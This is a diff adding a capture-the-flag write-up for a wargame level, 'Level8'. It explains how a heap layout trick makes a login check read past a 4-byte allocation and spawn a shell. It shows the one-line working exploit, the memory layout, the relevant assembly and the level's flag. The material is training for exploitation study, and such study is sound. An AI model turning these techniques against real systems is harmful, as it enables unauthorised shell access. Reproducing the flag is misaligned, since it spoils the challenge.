@@ -1,0 +1,56 @@
+# Level8 - Heap Layout Manipulation Exploit
+
+## Working Exploit
+
+```bash
+(echo "auth "; echo "service12345678901234567890123456789012"; echo "login"; cat) | ./level8
+```
+
+## How It Works
+
+### The Vulnerability
+The program has a critical flaw in the login check:
+- `auth` allocates only 4 bytes with `malloc(4)`
+- `login` checks `auth[32]` - 32 bytes past the auth pointer
+- This reads uninitialized memory that can be controlled via heap layout manipulation
+
+### The Exploitation
+1. **`auth `** - Allocates 4-byte buffer at 0x804a008, stores empty string
+2. **`service12345...`** - Long service string (40 characters) gets allocated by `strdup()`
+3. **Heap Layout Magic** - The service allocation contains data that reaches the auth+32 offset
+4. **`login`** - Checks `auth + 32`, finds non-zero data from service string
+5. **Success!** Condition passes → `system("/bin/sh")` executes
+
+### Memory Layout
+```
+0x804a008: auth buffer (4 bytes)
+   ...
+0x804a018: service string allocation  
+   ...
+0x804a028: auth + 32 (contains service data) ← This is what login checks!
+```
+
+### Key Insight
+The vulnerability isn't a traditional buffer overflow, but **heap layout manipulation**. The long service string allocation places data at memory locations that the login check reads, bypassing the authentication mechanism.
+
+## Technical Analysis
+
+### Assembly Check (0x080486e7):
+```asm
+mov    0x8049aac,%eax     ; Load auth pointer
+mov    0x20(%eax),%eax    ; Load auth[32] (0x20 = 32 bytes)  
+test   %eax,%eax          ; Check if != 0
+je     password_fail      ; Jump if zero (show "Password:")
+call   system             ; Execute "/bin/sh" if non-zero
+```
+
+### Why This Specific Payload Works
+- Empty `auth ` creates minimal allocation
+- 40-character service string is long enough to place data at the right heap offset  
+- The `strdup()` allocation contains ASCII characters (non-zero values)
+- When login reads `auth + 32`, it finds the service string data
+
+## Flag
+`c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
+
+This level demonstrates advanced heap exploitation techniques and the importance of proper bounds checking in authentication mechanisms.
